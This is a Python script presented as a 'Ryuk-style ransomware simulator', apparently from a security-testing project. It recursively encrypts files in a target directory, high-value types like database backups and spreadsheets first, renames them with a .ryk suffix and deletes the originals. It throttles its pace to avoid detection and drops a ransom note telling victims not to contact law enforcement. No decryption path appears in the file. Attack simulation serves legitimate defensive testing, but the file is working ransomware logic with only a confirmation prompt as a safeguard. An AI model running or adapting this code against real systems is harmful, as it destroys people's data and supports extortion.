"""
Ryuk-style ransomware simulator
Slow & Stealthy attack pattern
"""

import sys
import os
from pathlib import Path
import time

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from simulator.core.encryption import EncryptionEngine
from simulator.core.file_selector import FileSelector
from simulator.core.speed_controller import SpeedController


class RyukSimulator:
    """
    Simulates Ryuk-style ransomware attack
    
    Characteristics:
    - Slow encryption (5 files/minute)
    - Prioritizes high-value files (.sql, .bak, .xlsx, .docx)
    - Renames files with .ryk extension
    - Deletes original files
    """
    
    def __init__(
        self,
        target_dir: str,
        speed: int = 5,
        encryption_algorithm: str = "aes256"
    ):
        """
        Initialize Ryuk simulator
        
        Args:
            target_dir: Directory to attack
            speed: Files per minute
            encryption_algorithm: Encryption method to use
        """
        self.target_dir = Path(target_dir)
        self.speed = speed
        self.encryption_algorithm = encryption_algorithm
        
        # Priority extensions (high-value targets)
        self.priority_extensions = ['.sql', '.bak', '.xlsx', '.docx']
        
        # Secondary extensions
        self.secondary_extensions = ['.pdf', '.txt', '.jpg', '.png', '.doc']
        
        # All extensions
        all_extensions = self.priority_extensions + self.secondary_extensions
        
        # Initialize components
        self.encryptor = EncryptionEngine(encryption_algorithm)
        self.file_selector = FileSelector(
            target_dir=str(self.target_dir),
            extensions=all_extensions,
            recursive=True,
            priority_extensions=self.priority_extensions
        )
        self.speed_controller = SpeedController(speed, "minute")
        
        # Statistics
        self.files_encrypted = 0
        self.files_failed = 0
        self.total_bytes_encrypted = 0
    
    def encrypt_file(self, file_path: Path) -> bool:
        """
        Encrypt a single file and rename with .ryk extension
        
        Args:
            file_path: Path to file to encrypt
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Read file
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Track size
            self.total_bytes_encrypted += len(data)
            
            # Encrypt
            encrypted = self.encryptor.encrypt(data)
            
            # Create new path with .ryk extension
            new_path = file_path.with_suffix(file_path.suffix + '.ryk')
            
            # Write encrypted file
            with open(new_path, 'wb') as f:
                f.write(encrypted)
            
            # Delete original
            file_path.unlink()
            
            print(f"[RYUK] ✓ Encrypted: {file_path} → {new_path.name}")
            self.files_encrypted += 1
            return True
            
        except Exception as e:
            print(f"[RYUK] ✗ Failed: {file_path} - {e}")
            self.files_failed += 1
            return False
    
    def leave_ransom_note(self):
        """Create Ryuk-style ransom note"""
        note_content = """
═══════════════════════════════════════════════════════════

                    RYUK RANSOMWARE

═══════════════════════════════════════════════════════════

Your network has been compromised.

All files have been encrypted with RSA-4096 and AES-256.

Decryption is only possible with our private key.

═══════════════════════════════════════════════════════════

PAYMENT INSTRUCTIONS:
---------------------

1. Contact us at: [REDACTED - THIS IS A SIMULATION]

2. Provide your unique company ID: [REDACTED]

3. Bitcoin payment address will be provided

4. Decryption key delivered after payment confirmation

═══════════════════════════════════════════════════════════

⚠️  DO NOT:
-----------
- Attempt to decrypt files yourself
- Contact law enforcement or FBI
- Hire recovery companies
- Ignore this message

Failure to comply will result in:
- Public release of stolen data
- Permanent loss of decryption key
- Increased ransom amount

═══════════════════════════════════════════════════════════

THIS IS A SIMULATION FOR SECURITY TESTING PURPOSES ONLY

═══════════════════════════════════════════════════════════
"""
        
        note_path = self.target_dir / "RyukReadMe.txt"
        try:
            note_path.write_text(note_content)
            print(f"[RYUK] Ransom note created: {note_path}")
        except Exception as e:
            print(f"[RYUK] Failed to create ransom note: {e}")
    
    def run(self):
        """Execute the Ryuk-style attack"""
        print("=" * 60)
        print("[RYUK] Ryuk-Style Ransomware Simulation")
        print("=" * 60)
        print(f"[RYUK] Target: {self.target_dir}")
        print(f"[RYUK] Speed: {self.speed} files/minute (STEALTHY)")
        print(f"[RYUK] Encryption: {self.encryption_algorithm.upper()}")
        print(f"[RYUK] Priority targets: {', '.join(self.priority_extensions)}")
        print("=" * 60)
        
        # Find targets
        print("[RYUK] Scanning for high-value targets...")
        targets = self.file_selector.find_targets()
        print(f"[RYUK] Found {len(targets)} target files")
        
        if not targets:
            print("[RYUK] No files to encrypt. Exiting.")
            return
        
        # Show file statistics
        stats = self.file_selector.get_stats()
        print(f"[RYUK] File breakdown:")
        for ext, count in stats['by_extension'].items():
            priority_marker = "⭐" if ext in self.priority_extensions else "  "
            print(f"[RYUK]   {priority_marker} {ext}: {count} files")
        
        # Start encryption
        print("[RYUK] Starting slow, stealthy encryption...")
        print(f"[RYUK] Estimated time: {len(targets) / self.speed:.1f} minutes")
        self.speed_controller.start()
        
        for i, target in enumerate(targets, 1):
            print(f"[RYUK] Progress: {i}/{len(targets)}")
            self.encrypt_file(target)
            self.speed_controller.wait()
        
        # Leave ransom note
        self.leave_ransom_note()
        
        # Print statistics
        print("=" * 60)
        print("[RYUK] Attack Complete!")
        print("=" * 60)
        print(f"Files encrypted: {self.files_encrypted}")
        print(f"Files failed: {self.files_failed}")
        print(f"Total data encrypted: {self.total_bytes_encrypted / 1024:.2f} KB")
        print(f"Time elapsed: {self.speed_controller.get_elapsed_time() / 60:.2f} minutes")
        print(f"Actual rate: {self.speed_controller.get_actual_rate() * 60:.2f} files/minute")
        print("=" * 60)


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Ryuk-style ransomware simulator")
    parser.add_argument("target", help="Target directory to encrypt")
    parser.add_argument("--speed", type=int, default=5, help="Files per minute (default: 5)")
    parser.add_argument("--algorithm", default="aes256", choices=["fernet", "aes256", "chacha20"],
                       help="Encryption algorithm (default: aes256)")
    
    args = parser.parse_args()
    
    # Confirm before running
    print(f"\n⚠️  WARNING: This will encrypt all files in {args.target}")
    print("This is a SLOW attack simulation (5 files/minute by default).")
    print("This is for testing purposes only.")
    response = input("Continue? (yes/no): ")
    
    if response.lower() != "yes":
        print("Aborted.")
        return
    
    # Run simulation
    sim = RyukSimulator(args.target, args.speed, args.algorithm)
    sim.run()


if __name__ == "__main__":
    main()
